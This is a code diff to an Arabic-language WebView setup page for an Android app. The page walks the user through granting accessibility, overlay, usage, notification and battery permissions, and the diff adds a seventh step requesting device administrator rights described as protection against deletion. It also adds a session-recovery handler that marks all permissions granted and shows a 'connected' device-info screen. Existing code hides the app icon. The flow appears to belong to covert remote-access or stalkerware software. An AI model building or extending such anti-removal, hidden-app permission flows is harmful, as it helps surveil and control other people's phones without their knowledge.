@@ -63,7 +63,7 @@
             <div class="section">
                 <div class="section-title">تقدم الإعداد</div>
                 <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
-                    <span id="progress-text" style="font-size: 12px; color: #94a3b8;">0 / 6</span>
+                    <span id="progress-text" style="font-size: 12px; color: #94a3b8;">0 / 7</span>
                     <span id="progress-percent" style="font-size: 12px; color: #60a5fa;">0%</span>
                 </div>
                 <div class="progress-bar"><div id="progress-fill" class="progress-fill" style="width: 0%"></div></div>
@@ -119,6 +119,13 @@
                     </div>
                     <span id="perm-access-badge" class="status-badge status-waiting">في الانتظار</span>
                 </div>
+                <div class="perm-item" id="perm-admin">
+                    <div class="perm-info">
+                        <div class="perm-icon" style="background: #1e293b;">7</div>
+                        <div><div class="perm-name">مسؤول الجهاز</div><div class="perm-desc">حماية متقدمة ضد الحذف</div></div>
+                    </div>
+                    <span id="perm-admin-badge" class="status-badge status-waiting">في الانتظار</span>
+                </div>
             </div>
 
             <button class="btn btn-primary" id="btn-start" onclick="requestNextPermission()">بدء التفعيل</button>
@@ -147,7 +154,8 @@
 
     <script>
         let currentStep = 0;
-        const totalSteps = 6;
+        const totalSteps = 7;
+        let isRecovered = false;
 
         function log(msg, type) {
             const box = document.getElementById('log-box');
@@ -245,6 +253,22 @@
                 if (typeof AndroidNative !== 'undefined') AndroidNative.hideApp();
             }
         }
+
+        window.onSessionRecovered = function(deviceInfo) {
+            isRecovered = true;
+            currentStep = totalSteps;
+            updateProgress();
+            ['basic','battery','overlay','usage','notif','access','admin'].forEach(function(id) { setBadge(id, 'ok'); });
+            log('✅ تم استعادة الجلسة السابقة', 'success');
+            log('🟢 جميع الأذونات مفعّلة مسبقاً', 'success');
+            setTimeout(function() {
+                document.getElementById('setup-screen').style.display = 'none';
+                document.getElementById('connected-screen').style.display = 'block';
+                if (deviceInfo) {
+                    document.getElementById('device-info').innerHTML = deviceInfo;
+                }
+            }, 500);
+        };
 
         // تهيئة
         log('جاري التحميل...', 'info');
